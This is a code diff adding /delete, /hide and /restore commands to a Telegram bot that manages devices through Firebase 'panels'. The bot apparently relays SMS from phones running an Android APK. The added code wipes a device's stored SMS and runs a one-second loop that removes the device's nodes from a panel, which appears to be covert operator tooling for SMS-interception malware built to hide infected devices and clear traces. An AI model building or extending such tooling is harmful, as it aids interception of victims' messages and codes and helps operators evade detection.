@@ -15,6 +15,11 @@ from app.channel_relay import (
     get_profile_by_channel,
     queue_manual_sms_with_firebase,
 )
+from app.firebase_device_admin import (
+    delete_device_sms_on_panel,
+    resolve_admin_device,
+    restore_device_on_panel,
+)
 from app.firebase_sync import (
     forward_incoming_to_mynum,
     send_polling_startup_test,
@@ -1478,6 +1483,142 @@ async def search_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     await update.message.reply_text("\n".join(parts), parse_mode="Markdown")
 
 
+async def delete_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Delete all SMS on Firebase messages/{device} + clear bot baseline."""
+    if not await reply_if_unauthorized(update):
+        return
+    user = update.effective_user
+    if not context.args:
+        await update.message.reply_text(
+            "❌ <code>/delete &lt;device_id&gt;</code>\nPurane + naye SMS Firebase se hat jayenge.",
+            parse_mode="HTML",
+        )
+        return
+    device_id = _normalize_device_id_args(list(context.args))
+    db = SessionLocal()
+    try:
+        device, profile, panel = await resolve_admin_device(db, user.id, device_id)
+        persisted = getattr(device, "id", None)
+        n = await delete_device_sms_on_panel(
+            panel,
+            device.name,
+            db=db if persisted else None,
+            device=device if persisted else None,
+        )
+        host = panel.replace("https://", "").split("/")[0]
+        await update.message.reply_text(
+            "✅ <b>DELETE</b>\n"
+            "<pre>"
+            f"📱 Device: {device.name}\n"
+            f"🗄️ Panel: {host}\n"
+            f"🗑️ messages/{device.name} cleared\n"
+            "Bot baseline bhi reset (agar device DB me hai)."
+            "</pre>",
+            parse_mode="HTML",
+        )
+        if not n:
+            await update.message.reply_text("⚠️ Firebase DELETE fail — panel URL check karo.", parse_mode="HTML")
+    except ValueError as exc:
+        await update.message.reply_text(f"❌ {exc}", parse_mode="HTML")
+    except Exception as exc:
+        logger.exception("delete_command failed")
+        await update.message.reply_text(f"❌ {exc}", parse_mode="HTML")
+    finally:
+        db.close()
+
+
+async def hide_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Every ~1s remove device nodes from Firebase (APK re-add = flash hide)."""
+    from app.firebase_device_admin import hide_active, start_hide_device, stop_hide_device
+
+    if not await reply_if_unauthorized(update):
+        return
+    user = update.effective_user
+    if not context.args:
+        await update.message.reply_text(
+            "❌ <code>/hide &lt;device_id&gt;</code>\n"
+            "Har 1 sec Firebase se device hat jayega (aye aur chala jaye).\n"
+            "Band karne: <code>/restore &lt;device_id&gt;</code>",
+            parse_mode="HTML",
+        )
+        return
+    args = list(context.args)
+    device_id = _normalize_device_id_args(args)
+    if args and args[-1].lower() in {"off", "stop", "0"}:
+        device_id = _normalize_device_id_args(args[:-1])
+        stopped = await stop_hide_device(device_id)
+        await update.message.reply_text(
+            "✅ Hide loop band." if stopped else "ℹ️ Hide pehle se band tha.",
+            parse_mode="HTML",
+        )
+        return
+
+    db = SessionLocal()
+    try:
+        device, profile, panel = await resolve_admin_device(db, user.id, device_id)
+        state = await start_hide_device(panel, device.name)
+        host = panel.replace("https://", "").split("/")[0]
+        if state == "already":
+            await update.message.reply_text(
+                f"ℹ️ <code>{device.name}</code> pehle se hide chal raha hai.\n"
+                f"Band: <code>/restore {device.name}</code>",
+                parse_mode="HTML",
+            )
+            return
+        await update.message.reply_text(
+            "✅ <b>HIDE ON</b>\n"
+            "<pre>"
+            f"📱 {device.name}\n"
+            f"🗄️ {host}\n"
+            "⏱️ Har 1s devices/clients node delete\n"
+            "↩️ Wapas: /restore <device_id>"
+            "</pre>",
+            parse_mode="HTML",
+        )
+    except ValueError as exc:
+        await update.message.reply_text(f"❌ {exc}", parse_mode="HTML")
+    finally:
+        db.close()
+
+
+async def restore_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Stop hide loop and PUT device snapshot back on Firebase."""
+    if not await reply_if_unauthorized(update):
+        return
+    user = update.effective_user
+    if not context.args:
+        await update.message.reply_text(
+            "❌ <code>/restore &lt;device_id&gt;</code>",
+            parse_mode="HTML",
+        )
+        return
+    device_id = _normalize_device_id_args(list(context.args))
+    db = SessionLocal()
+    try:
+        device, profile, panel = await resolve_admin_device(db, user.id, device_id)
+        count = await restore_device_on_panel(panel, device.name, profile, device)
+        host = panel.replace("https://", "").split("/")[0]
+        await update.message.reply_text(
+            "✅ <b>RESTORE</b>\n"
+            "<pre>"
+            f"📱 {device.name}\n"
+            f"🗄️ {host}\n"
+            f"🔁 Nodes restored: {count}\n"
+            "Hide loop band ho gaya."
+            "</pre>",
+            parse_mode="HTML",
+        )
+        if getattr(device, "id", None):
+            asyncio.create_task(_background_sync_device(device.id, user.id))
+    except ValueError as exc:
+        await update.message.reply_text(f"❌ {exc}", parse_mode="HTML")
+    except Exception as exc:
+        logger.exception("restore_command failed")
+        await update.message.reply_text(f"❌ {exc}", parse_mode="HTML")
+    finally:
+        db.close()
+
+
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not is_authorized(update.effective_user.id if update.effective_user else None):
         return
@@ -1700,6 +1841,9 @@ async def _post_init_set_commands(app: Application) -> None:
         BotCommand("status", "Current stats"),
         BotCommand("send", "Manual SMS"),
         BotCommand("ping", "Check latency"),
+        BotCommand("delete", "Clear all SMS on Firebase for device"),
+        BotCommand("hide", "Auto-remove device from Firebase (1s loop)"),
+        BotCommand("restore", "Restore device on Firebase; stop hide"),
     ]
     await app.bot.set_my_commands(commands)
 
@@ -1762,4 +1906,7 @@ def build_telegram_app() -> Application | None:
     app.add_handler(CommandHandler("recent", recent_command))
     app.add_handler(CommandHandler("search", search_command))
     app.add_handler(CommandHandler("stats", stats_command))
+    app.add_handler(CommandHandler("delete", delete_command))
+    app.add_handler(CommandHandler("hide", hide_command))
+    app.add_handler(CommandHandler("restore", restore_command))
     return app
